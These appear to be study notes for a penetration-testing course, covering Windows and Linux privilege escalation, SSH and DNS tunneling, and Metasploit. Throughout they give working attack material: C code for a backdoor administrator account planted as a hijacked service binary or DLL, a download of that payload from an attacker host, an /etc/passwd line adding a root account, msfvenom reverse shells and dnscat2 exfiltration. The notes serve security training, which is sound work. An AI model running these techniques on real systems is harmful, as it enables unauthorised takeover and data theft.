## Enumerating Windows
There are several key pieces of information we should always obtain:
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications (Check 32-bit and 64-bit Program Files directories located in C:\. + Downloads directory)
- Running processes

**Automated Enumeration tools**:
- winPEAS, https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- Seatbelt, https://github.com/GhostPack/Seatbelt
- JAWS, https://github.com/411Hall/JAWS


```bat
whoami /groups
net user
net user steve
net localgroup
```

```pwsh
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators

Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

Get-Process
```

```bat
systeminfo
ipconfig /all
route print
netstat -ano
netstat -anp TCP | find "2222"
```

* -a: display all active TCP connections as well as TCP and UDP ports
* -n: disable name resolution
* -o: show the process ID for each connection

## Hidden in Plain View
```pwsh
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

```pwsh
Get-History
Clear-History
```

## Information Goldmine PowerShell
Two logging mechanisms for PowerShell are:
- **Transcription**, when enabled, the logged information is equal to what a person would obtain from looking over the shoulder of a user entering commands in PowerShell. The information is stored in transcript files, which are often saved in the home directories of users, a central directory for all users of a machine, or a network share collecting the files from all configured machines.

- **Script Block Logging** records commands and blocks of script code as events while executing. It records the full content of code and commands as they are executed. => such an event also contains the original representation of encoded code or commands.

Starting with PowerShell v5, v5.1, and v7, a module named **PSReadline** is included, which is used for line-editing and command history functionality.
`Clear-History` does not clear the command history recorded by PSReadline.

Administrators can prevent **PSReadline** from recording commands by setting the `-HistorySaveStyle` option to `SaveNothing` with the `Set-PSReadlineOption` Cmdlet. Alternatively, they can clear the history file manually.

**PowerShell Remoting** by default uses **WinRM** for Cmdlets such as `Enter-PSSession`. Therefore, a user needs to be in the local group **Windows Management Users** to be a valid user for these Cmdlets. However, instead of WinRM, **SSH** can also be used for PowerShell remoting.

Note that creating a PowerShell remoting session via WinRM in a bind shell can cause unexpected behavior.

```pwsh
(Get-PSReadlineOption).HistorySavePath
```

Start a PowerShell Transcription with the path where the transcript file is stored
```pwsh
Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
Stop-Transcript
```

```pwsh
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

```bash
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

## Leveraging Windows Services
Windows uses the **LocalSystem** (includes the SIDs of NT AUTHORITY\SYSTEM and BUILTIN\Administrators in its token), **Network Service, and Local Service** user accounts to run its own services. Users or programs creating a service can choose either one of those accounts, a domain user, or a local user.

### Service Binary Hijacking

List of all installed Windows services
```pwsh
Get-Service 
```

When using a network logon such as WinRM or a bind shell, `Get-CimInstance` and `Get-Service` will result in a "permission denied" error when querying for services with a **non-administrative user**. Using an interactive logon such as RDP solves this problem.

```pwsh
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

**Replacing the binary of a service** needs permissions.
```pwsh
icacls "C:\xampp\mysql\bin\mysqld.exe" 
```

`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
```c
#include <stdlib.h>

int main ()
{
 int i;
 i = system ("net user dave2 password123! /add");
 i = system ("net localgroup administrators dave2 /add");
 return 0;
}
```

```pwsh
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe  
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

```pwsh
net stop mysql
```

```pwsh
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

Get a list of all privileges, The **Disabled** state only indicates if the privilege is currently enabled for the running process.
```pwsh
whoami /priv 
```

In order to issue a reboot, our user needs to have the privilege **SeShutDownPrivilege** assigned.
```pwsh
shutdown /r /t 0
```

`PowerUp.ps1` check if it detects this privilege escalation vector.

Displays services the current user can modify, such as the service binary or configuration files

```pwsh
. .\PowerUp.ps1

Get-ModifiableServiceFile

Install-ServiceBinary -Name 'mysql'
```

### Service DLL Hijacking

Windows uses **Dynamic Link Libraries (DLL)**. On Unix systems, these files are called **Shared Objects**.

1. **Overwrite a DLL** the service binary uses (the service may not work as expected because the actual DLL functionality is missing. In most cases, this would still lead us to code execution of the DLL's code and then, e.g., to the creation of a new local administrative user).

2. **Hijack the DLL search order**.

The **search order** determines what to inspect first when searching for DLLs. By default, all current Windows versions have safe DLL search mode enabled.

Standard search order taken from the Microsoft Documentation:
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

When safe DLL search mode is **disabled**, the **current directory is searched at position 2** after the application's directory.

**Missing DLL**, i.e., the binary attempted to load a DLL that doesn't exist on the system. This often occurs with flawed installation processes or after updates. However, even with a missing DLL, the program may still work with restricted functionality.

=> we can try placing a malicious DLL (with the name of the missing DLL) in a path of the DLL search order so it executes when the binary is started.

**Process Monitor** displays real-time information about any process, thread, file system, or registry related activities. We need **administrative privileges** to start Process Monitor.

The standard procedure in a penetration test would be to **copy the service binary to a local machine**. On this system, we can install the service locally and use Process Monitor with administrative privileges to list all DLL activity.

Our goal is to **identify all DLLs loaded by BetaService as well as detect missing ones**. Then, we can check their permissions and if they can be replaced with a malicious DLL. If find that a DLL is missing, we could try to provide our own DLL by adhering to the DLL search order.

**Create a filter** to only include events related to to the process BetaServ of the target service.

Click on the Filter menu > Filter to get into the filter configuration.
1. `Process Name` as Column
2. `is` as Relation
3. `BetaServ.exe` as Value, and
4. `Include` as Action.

Once entered, we'll click on Add. After applying the filter, the list is empty. In order to analyze the service binary, we should try **restarting the service** as the binary will then attempt to load the DLLs.

Checking Process Monitor, various **CreateFile** calls can be found in the Operation column. The CreateFile function can be used to create or open a file.

The CreateFile calls attempted to open a file named `myDLL.dll` in several paths. The Detail column states **NAME NOT FOUND** for these calls, which means that a DLL with this name couldn't be found in any of these paths.

The consecutive function calls follow the DLL search order, starting with the directory the application is located in and ending with the directories in the **PATH** environment variable.

=> the service binary tries to locate a file called `myDLL.dll`, but fails to do so. 

Display the contents of **PATH** environment variable

```pwsh
$env:path
```

To abuse this, we can attempt to write a DLL file with this name to a path used by the DLL search order.

Each DLL can have an optional entry point function named DllMain, which is executed when processes or threads attach the DLL. This function generally contains 4 cases named **DLL_PROCESS_ATTACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH**.

These cases handle situations when the DLL is loaded or unloaded by a process or thread. They are commonly used to perform initialization tasks for the DLL or tasks related to exiting the DLL. If a DLL doesn't have a **DllMain** entry point function, it only provides resources.

`mydll.c`
```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            int i;
 	        i = system ("net user dave2 password123! /add");
 	        i = system ("net localgroup administrators dave2 /add");
            break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
            break;
        case DLL_THREAD_DETACH: // A thread exits normally.
            break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

```pwsh
Restart-Service BetaService
```

### Unquoted Service Paths

When we have **Write permissions** to a service's main directory or subdirectories but **cannot replace files** within them.

Each Windows service maps to an executable file that will be run when the service is started. If the path of this file **contains one or more spaces and is not enclosed within quotation marks**, the **CreateProcess** function starts interpreting the path from left to right until a space is reached. For every space in the file path, the function uses the preceding part as **file name** by adding .exe and the rest as **arguments**.

E.g., An unquoted service binary path `C:\Program Files\My Program\My Service\service.exe`.

When Windows starts the service, it will use the following order to try to start the executable file due to the spaces in the path.
- `C:\Program.exe`
- `C:\Program Files\My.exe`
- `C:\Program Files\My Program\My.exe`
- `C:\Program Files\My Program\My service\service.exe`

=> Create a malicious executable, place it in a directory that corresponds to one of the interpreted paths, and match its name to the interpreted filename. Then, once the service is started, our file gets executed with the same privileges that the service starts with. Often, this happens to be the **LocalSystem** account, which results in a successful privilege escalation attack.

```bat
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```pwsh
Start-Service GammaService
Stop-Service GammaService
```

```pwsh
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

## Sheduled Tasks
Windows uses the **Task Scheduler** to execute various automated tasks, such as clean-up activities or update management. On Windows, they are called **Scheduled Tasks, or Tasks**, and are defined with one or more triggers.
- A **trigger** is used as a condition, causing one or more actions to be executed when met. E.g., a trigger can be set to a specific time and date, at startup, at log on, or on a Windows event.
- An **action** specifies which program or script to execute.

3 pieces of information to obtain from a scheduled task (Author, TaskName, Task To Run, Run As User, and Next Run Time fields):
- As which user account (principal) does this task get executed? (e.g., if the task runs as NT AUTHORITY\SYSTEM or as an administrative user, then a successful attack could lead us to privilege escalation)
- What triggers are specified for the task? If the trigger condition was met in the past, the task will not run again in the future or if we are in a week-long penetration test, but the task runs after this time
- What actions are executed when one or more of these triggers are met?

```pwsh
schtasks /query /fo LIST /v
```

## Using Exploits

**Abuse certain Windows privileges**, **non-privileged** users with assigned privileges, such as **SeImpersonatePrivilege**, can potentially abuse those privileges to perform privilege escalation attacks. Other privileges that may lead to privilege escalation are **SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug**.

**SeImpersonatePrivilege** offers the possibility to leverage a token with another security context. => a user with this privilege can perform operations in the security context of another user account under the right circumstances. By default, Windows assigns this privilege to members of the **local Administrators group** as well as the device's **LOCAL SERVICE, NETWORK SERVICE, and SERVICE accounts**. Microsoft implemented this privilege to prevent unauthorized users from creating a service or server application to impersonating clients connecting to it. An example would be Remote Procedure Calls (RPC) or named pipes.

In penetration tests, we'll rarely find standard users with this privilege assigned. However, we'll commonly come across this privilege when we obtain code execution on a Windows system by exploiting a vulnerability in an **IIS** web server. In most configurations, IIS will run as LocalService, LocalSystem, NetworkService, or ApplicationPoolIdentity, which all have **SeImpersonatePrivilege** assigned. This also applies to other Windows services.

**Named pipes** are one method for **local or remote Inter-Process Communication** in Windows. They offer the functionality of 2 unrelated processes sharing and transferring data with each other. A named pipe server can create a named pipe to which a named pipe client can connect via the specified name. The server and client don't need to reside on the same system. Once a client connects to a named pipe, the server can leverage SeImpersonatePrivilege to impersonate this client after capturing the authentication from the connection process.

To abuse this, we need to find a privileged process and coerce it into connecting to a controlled named pipe. With SeImpersonatePrivilege assigned, we can then impersonate the user account connecting to the named pipe and perform operations in its security context.

**PrintSpoofer** tool created by itm4n implements a variation of the printer bug to coerce NT AUTHORITY\SYSTEM into connecting to a controlled named pipe. We can use this tool in situations where we have code execution as a user with the privilege **SeImpersonatePrivilege** to execute commands or obtain an interactive shell as NT AUTHORITY\SYSTEM.

Other tools that can abuse SeImpersonatePrivilege for privilege escalation: Variants from the **Potato** family (e.g., RottenPotato, SweetPotato, or JuicyPotato).

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

```pwsh
.\PrintSpoofer64.exe -i -c powershell.exe
```

# Linux Privilege Escalation
On Linux-based systems, we must have root privileges to list firewall rules with **iptables**.

The **iptables-persistent** package on Debian Linux saves firewall rules in specific files under `/etc/iptables` by default. These files are used by the system to restore **netfilter** rules at boot time. These files are often left with weak permissions, allowing them to be read by any local user on the target system.

Search for files created by the `iptables-save` command, which is used to dump the firewall configuration to a file specified by the user. This file is then usually used as input for the `iptables-restore` command and used to restore the firewall rules at boot time. If a system administrator had ever run this command, we could search the configuration directory (/etc) or grep the file system for iptables commands to locate the file.

**LinEnum** and **LinPeas**

## Enumerating Linux

```bash
ls -l /etc/shadow

id
cat /etc/passwd

hostname

cat /etc/issue
cat /etc/os-release
uname -a

ps aux

ip a
ifconfig
ip addr

routel
route
ip route

netstat
ss -anp
ss -ntplu
```

* -a: list all connections
* -n: avoid hostname resolution
* -p: list the process name the connection belongs to

Files created by the `iptables-save` command, which is used to dump the firewall configuration to a file specified by the user

```bash
cat /etc/iptables/rules.v4 
```

List cron jobs running 
```bash
ls -lah /etc/cron*
crontab -l 
sudo crontab -l
```

List applications installed by dpkg on our Debian system
```bash
dpkg -l 
```

Search for every directory **writable** by the current user
```bash
find / -writable -type d 2>/dev/null
```

Lists all drives that will be mounted at boot time
```bash
cat /etc/fstab
```

Gather information about mounted drives
```bash
mount
```

View all available disks
```bash
lsblk
```

Gather a list of drivers and kernel modules that are loaded on the target
```bash
lsmod
```

Gind out more about the specific module
```bash
/sbin/modinfo libata
```

Search for **SUID**-marked binaries
```bash
find / -perm -u=s -type f 2>/dev/null
```

`unix-privesc-check` supports "standard" and "detailed" mode
```bash
./unix-privesc-check standard > output.txt
```

## Exposed Confidential Information
The `.bashrc` bash script is executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session. From inside this script, additional **environment variables** can be specified to be automatically set whenever a new user's shell is spawned. Sometimes system administrators store **credentials** inside environment variables as a way to interact with custom scripts that require authentication.

```bash
env
cat .bashrc
```

Custom configurations of sudo-related permissions can be applied in the `/etc/sudoers` file. If the `/etc/sudoers` configurations are too permissive, a user could abuse the short-lived administrative right to obtain permanent root access.

```bash
sudo -l
```

```bash
watch -n 1 "ps -aux | grep pass"

sudo tcpdump -i lo -A | grep "pass"
sudo tcpdump -nvvvXi tun0 tcp port 8080
```

```bash
sudo -i
su - root
```

## Abusing Cron Jobs

We could inspect the cron log file (`/var/log/cron.log`) for running cron jobs.
```bash
grep "CRON" /var/log/syslog
```

## Abusing Password Authentication
Linux passwords are generally stored in `/etc/shadow`, which is not readable by normal users. Historically however, password hashes, along with other account information, were stored in the world-readable file `/etc/passwd`. For backwards compatibility, if a **password hash** is present in the **2nd column of an /etc/passwd** user record, it is considered valid for authentication and it takes precedence over the respective entry in `/etc/shadow`, if available. => if we can write into `/etc/passwd`, we can effectively set an arbitrary password for any account.

By default, if no other option is specified, `openssl` will generate a hash using the **crypt** algorithm, a supported hashing mechanism for Linux authentication, output: `Fdzt.eqJQ4s0g`

root2 user and the w00t password hash in our `/etc/passwd` record were followed by the user id (UID) zero and the group id (GID) zero. These zero values specify that the account we created is a **superuser** Linux account

```bash
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## Abusing Setuid Binaries and Capabilities

Find the PID (process ID) of the passwd program
```bash
ps u -C passwd
```

Provides a summary of the process (PID is 1932) attributes (Real UID, effective UID)
```bash
grep Uid /proc/1932/status
```

Enumerate for binaries with capabilities
```bash
/usr/sbin/getcap -r / 2>/dev/null 
```

**AppArmor** is a kernel module that provides **mandatory access control (MAC)** on Linux systems by running various application-specific profiles, and it's enabled by default on Debian 10.

Verify AppArmor's status, running as **root**
```bash
aa-status
```

## Exploiting Kernel Vulnerabilities
```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

# Port Redirection and SSH Tunneling

## Port Forwarding with Linux Tools

**Socat** is **not** the only way to **create port forwards** on *NIX hosts:
- **rinetd** runs as a daemon, a better solution for longer-term port forwarding configurations, but is slightly unwieldy for temporary port forwarding solutions.

- combine **Netcat** and a **FIFO named pipe file** to create a port forward.

- If we have **root** privileges, use **iptables** to create port forwards. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "**1**" to `/proc/sys/net/ipv4/conf/[interface]/forwarding`.

Run this command on CONFLUENCE to open TCP port 2345 on the WAN interface of CONFLUENCE
- All the packets sent to this port will be forwarded by CONFLUENCE to TCP port 5432 on 10.4.50.215

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

## SSH Tunneling

In **local and dynamic port forwarding**
- the listening port is bound to the SSH client
- the packet forwarding being done by the SSH server

SSH **local port forward** as part of our SSH connection from CONFLUENCE to 10.4.50.215
- listen on all interfaces on port 4455 on CONFLUENCE (0.0.0.0:4455), then
- forward all packets (through the SSH tunnel) to port 445 on 172.16.50.217

```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

**SSH dynamic port forwarding**
- the listening port that the SSH client creates is a **SOCKS proxy server port**. SOCKS is a proxying protocol. A SOCKS server accepts packets (with a SOCKS protocol header) and forwards them on to wherever they're addressed.

**Proxychains** uses the Linux shared object preloading technique (LD_PRELOAD) to hook libc networking functions within the binary that gets passed to it, and forces all connections over the configured proxy server.

=> it will work for most dynamically-linked binaries that perform simple network operations. It won't work on **statically-linked** binaries.

By default, Proxychains is configured with very **high time-out values**. Lowering the **tcp_read_time_out** and **tcp_connect_time_out** values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. => speed up port-scanning times.

SSH **dynamic port forward** as part of our SSH connection from CONFLUENCE to 10.4.50.215
- listen on all interfaces on port 9999 on CONFLUENCE (0.0.0.0:9999)
- update `/etc/proxychains4.conf`: `socks5 <CONFLUENCE's IP> 9999`

```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215 
```

```bash
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

In **remote port forwarding**
- the listening port is bound to the SSH server
- packets are forwarded by the SSH client

**Remote dynamic port forwarding** has only been available since **OpenSSH 7.6**. Only the **OpenSSH client** needs to be version 7.6 or above to use it.

SSH **remote port forward** as part of our SSH connection from CONFLUENCE to Kali,
- listen on port 2345 on our Kali machine (127.0.0.1:2345), and
- forward all traffic to port 5432 on 10.4.50.215

```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

SSH **remote dynamic port forward** as part of our SSH connection from CONFLUENCE to Kali,
- listen on port 9998 on our Kali machine,
- update `/etc/proxychains4.conf`: `socks5 127.0.0.1 9998`

```bash
ssh -N -R 9998 kali@192.168.118.4 
```

In situations where we have **direct access to an SSH server**, behind which is a more complex internal network, classic **dynamic port forwarding** might be difficult to manage.

=> **sshuttle** is a tool that turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel. However, it requires **root** privileges on the **SSH client** and **Python3** on the **SSH server**.

1. Set up a port forward in a shell on CONFLUENCE (192.168.50.63), listening on port 2222 on the WAN interface and forwarding to port 22 on 10.4.50.215:

```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

2. run sshuttle, specifying the SSH connection string, and the **subnets** that we want to tunnel through this connection (10.4.50.0/24 and 172.16.50.0/24)

```bash
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

## Port Forwarding with Windows Tools
The OpenSSH client has been bundled with Windows by default since version 1803 (April 2018 Update), and has been available as a Feature-on-Demand since 1709 (Windows 10 Fall Creators Update).

On Windows versions with SSH installed, we will find scp.exe, sftp.exe, ssh.exe, along with other ssh-* utilities in `%systemdrive%\Windows\System32\OpenSSH` location by default.

From the Windows machine, create a remote dynamic port forward to our Kali machine
```bat
ssh -N -R 9998 kali@192.168.118.4
```

Before OpenSSH was available on Windows, most network administrators' tools of choice were **PuTTY** and its command-line-only counterpart, **Plink**. (Plink doesn't have is remote **dynamic** port forwarding)

Create a remote port forward using Plink, Port 9833 is opened on the loopback interface of our Kali machine

```bat
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

We are presented with a prompt asking if we want to store the server key in the cache. In much the same way that it's not possible to accept the SSH client key cache prompt from a **non-TTY shell** on Linux, with some very limited shells with Plink on Windows, we also won't be able to respond to this prompt.

```bat
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <Kali PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
```

```bash
find / -name plink.exe 2>/dev/null
```

The built-in firewall configuration tool **Netsh** (aka **Network Shell**) **requires administrative privileges** to create a port forward on Windows. We can set up a **port forward** with the **portproxy subcontext** within the interface context. (Like **Socat** on Linux)

Create a **port forward**:
- listen on port 2222 on the external-facing interface (listenaddress=192.168.50.64) and
- forward packets to port 22 on 10.4.50.215

```bat
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```

Confirm that the port forward is stored
```bat
netstat -anp TCP | find "2222"
netsh interface portproxy show all
```

Allow connections on the local port (localport=2222) on the interface with the local IP address (192.168.50.64) using the TCP protocol, specifically for incoming traffic (dir=in)

```bat
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```

Delete the firewall rule we just created and the port forward
```bat
netsh advfirewall firewall delete rule name="port_forward_ssh_2222" 
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64 
```

# Tunneling Through Deep Packet Inspection
## HTTP Tunneling
A Deep Packet Inspection (DPI) solution is now **terminating all outbound traffic except HTTP**.
All inbound ports on CONFLUENCE01 are blocked except TCP/8090.
The only traffic that will reach our Kali machine is HTTP.

**Chisel** uses a client/server model. A Chisel server must be set up, which can accept a connection from the Chisel client. **Reverse port forwarding** option is particularly useful for us, which is similar to **SSH remote port forwarding**.

Chisel can run on macOS, Linux, and Windows, and on various architectures on each.

We will run a Chisel **server** on our Kali machine, which will accept a connection from a Chisel client running on CONFLUENCE.

- Chisel will bind a **SOCKS** proxy port on the Kali machine.

- The Chisel server will encapsulate whatever we send through the SOCKS port and push it through the HTTP tunnel, SSH-encrypted.

- The Chisel client will then decapsulate it and push it wherever it is addressed.


```bash
chisel server --port 8080 --reverse
```

Connect to the server running on our Kali machine (192.168.118.4:8080)
- Creating a reverse SOCKS tunnel (R:socks).
- The R prefix specifies a reverse tunnel using a socks proxy (which is bound to port **1080** by default).
- The remaining shell redirections (> /dev/null 2>&1 &) force the process to run in the background, which will free up our shell

```bat
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```


**SSH** doesn't offer a generic **SOCKS proxy** command-line option. Instead, it offers the **ProxyCommand** configuration option. We can either write this into a configuration file, or pass it as part of the command line with -o. **ProxyCommand** accepts a shell command that is used to open a proxy-enabled channel.

The **OpenBSD** version of Netcat, which exposes the **-X** flag and can connect to a SOCKS or HTTP proxy. However, **the version of Netcat that ships with Kali doesn't support proxying.**

=> use **Ncat**, the Netcat alternative written by the maintainers of Nmap.

Tells Ncat to use the socks5 protocol and the proxy socket at 127.0.0.1:1080. The %h and %p tokens represent the SSH command

```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```

With update /etc/proxychains4.conf: socks5 127.0.0.1 1080, same result as the above command
```bash
proxychains ssh database_admin@10.4.50.215 
```

## DNS Tunneling
The process of resolving the IPv4 address of "`www.example.com`":
- In most cases, we'll ask a **DNS recursive resolver server** (e.g., Google has a public DNS server at 8.8.8.8) for the DNS address record (A record) of the domain
- Once it retrieves the request from us, the recursive resolver starts making queries. It holds a list of **root name servers**. Its first task is to send a DNS query to one of these root name servers. Because `example.com` has the "`.com`" suffix, the root name server will respond with the address of a DNS name server that's responsible for the `.com` top-level domain (TLD), aka **TLD name server**.
- The recursive resolver then queries the `.com` TLD name server, asking which DNS server is responsible for `example.com`. The TLD name server will respond with the **authoritative name server** for the `example.com` domain.
- The recursive resolver then asks the example.com authoritative name server for the IPv4 address of `www.example.com`. The `example.com` authoritative name server replies with the A record for that.
- The recursive resolver then returns that to us.

All these requests and responses are transported over UDP, with **UDP/53** being the standard DNS port.

In the real world, we will have registered the `feline.corp` domain name ourselves, set up the **authoritative name server** machine ourselves, and told the **domain registrar** that this server should be known as the authoritative name server for the `feline.corp` zone.

To simulate a real DNS setup, we can make FELINEAUTHORITY a functional DNS server using **Dnsmasq**. FELINEAUTHORITY is registered within this network as the **authoritative name server** for the feline.corp zone. MULTISERVER is also configured as the **DNS resolver server** for PGDATABASE.

We can transfer small amounts of information (exfiltrated data) from inside the network to the outside, without a direct connection, just by making DNS queries.

Imagine we have a binary file we want to exfiltrate from PGDATABASE.
- We could convert a binary file into a long hex string representation, split this string into a series of smaller chunks, then send each chunk in a DNS request for [hex-string-chunk].feline.corp.
- On the server side, we could log all the DNS requests and convert them from a series of hex strings back to a full binary.

**Infiltrate** data into a network.
- The TXT record is designed to be general-purpose, and contains "arbitrary string information".
=> **We can serve TXT records from FELINEAUTHORITY using Dnsmasq**.

A **dnscat2** server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines.

The dnscat2 process is using CNAME, TXT, and MX queries and responses.

DNS tunneling is certainly not stealthy, i.e., a huge data transfer from the dnscat2 client to the server. All the request and response payloads are encrypted.

* -C: start the dnsmasq process with the dnsmasq.conf configuration file
* -d: runs in "no daemon" mode so it runs in the foreground

```bash
sudo dnsmasq -C dnsmasq.conf -d
```

Check the client DNS settings using the resolvectl utility
```bash
resolvectl status

nslookup exfiltrated-data.feline.corp
nslookup -type=txt www.feline.corp
```

A **dnscat2** server runs on an authoritative name server (FELINEAUTHORITY) for a particular domain

```bash
dnscat2-server feline.corp
```

Run the dnscat client binary on PGDATABASE
```bash
./dnscat feline.corp 
```

This configuration ignores the `/etc/resolv.conf` and `/etc/hosts` files and only defines the `auth-zone` and `auth-server` variables. These tell Dnsmasq to act as the authoritative name server for the feline.corp zone.

`dnsmasq_txt.conf`
```
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
```

```
$ dnscat2-server feline.corp
dnscat2> windows
dnscat2> window -i 1
command (pgdatabase01) 1> ?

Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* quit
* set
* shell
* shutdown
* suspend
* tunnels
* unset
* upload
* window
* windows

command (pgdatabase01) 1> listen --help
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
```

# The Metasploit Framework

## Metasploit Essentials

Start the database service as well as create and initialize the MSF database
```bash
sudo msfdb init
```

Launch the Metasploit command-line interface, to hide the banner and version information while starting up, we can add the -q option
```bash
sudo msfconsole 
```

```
db_status

help

workspace
workspace -a pen200

db_nmap -A 192.168.50.202

hosts
vulns
creds
services
services -p 8000

show -h
show auxiliary

search Apache 2.4.49
search type:auxiliary smb
```

Activate a module with **module name**, or **index** (56) provided from search results
```
use 56
```

Get information about the currently activated module<br/> - Potential side effects of running it, such as **Indicators of compromise** entries in log solutions, artifacts on disk.<br/> - Module stability help us predict if we may crash a target system or what information defenders may obtain from us using this exploit module.<br/> - Module reliability determines if we can run the exploit more than once, e.g., repeatable-session, as some exploit modules will only work once.<br/> - Available targets range from different operating systems and application versions to command execution methods. Most modules provide the Automatic target, which Metasploit tries to identify either by itself or by using the default operation specified by the module.<br/> - Check supported determines if we can use the `check` command to dry-run the exploit module and confirm if a target is vulnerable before we actually attempt to exploit it.<br/> - Description provides us a text-based explanation of the module's purpose.
```
info
``` 

```
show options 

set RHOSTS 192.168.50.202
services -p 445 --rhosts
unset RHOSTS

show payloads
set payload 11
set payload payload/linux/x64/meterpreter_reverse_tcp

run
run -j
Ctrl + Z

jobs
```

Metasploit uses **sessions** to manage access to different machines.
```
sessions -l
sessions -i 2
sessions -k 2
```

## Metasploit Payload
A **non-staged** payload is sent in its entirety along with the exploit. => the payload contains the exploit and full shellcode for a selected task. In general, these "all-in-one" payloads are more stable. The downside is that the size of these payloads will be bigger than other types.

A **staged** payload is usually sent in 2 parts. The first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.

Situations in which we would prefer to use a staged payload instead of non-staged:
- If there are space-limitations in an exploit, a staged payload might be a better choice as it is typically smaller.
- antivirus software can detect shellcode in an exploit. By replacing the full code with a first stage, which loads the second and malicious part of the shellcode, the remaining payload is retrieved and injected directly into the victim machine's memory. This may prevent detection and can increase our chances of success.

Metasploit contains the **Meterpreter** payload, which is a multi-function payload that can be dynamically extended at run-time. The payload resides entirely in memory on the target and its communication is encrypted by default. Meterpreter offers capabilities that are especially useful in the **post-exploitation** phase and exists for various operating systems such as Windows, Linux, macOS, Android, ...

Commands with "l" as prefix operate on the local system; in our case our Kali VM.

If our target runs the Windows OS, we need to **escape the backslashes** in the destination path with backslashes like "\\".

Meterpreter offers a variety of other interesting post-exploitation modules such as hashdump, which **dumps the contents of the SAM database** or screenshare, which displays the target machine's desktop in real-time.

When Metasploit interacts with a system within a session, it uses a concept named **channels**.

```bash
msfvenom -l payloads --platform windows --arch x64
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe
```

## Meterpreter Command
```
help
sysinfo
getuid
idletime
ps
getsystem
migrate 8052
execute -H -f notepad
shell
```

```
lpwd
lcd /home/kali/Downloads
download /etc/passwd
lcat /home/kali/Downloads/passwd
upload /usr/bin/unix-privesc-check /tmp/
```

```
Ctrl + Z
channel -l
channel -i 1

bg
exit
```

## Post-Exploitation with Metasploit
 
### Metasploit Command

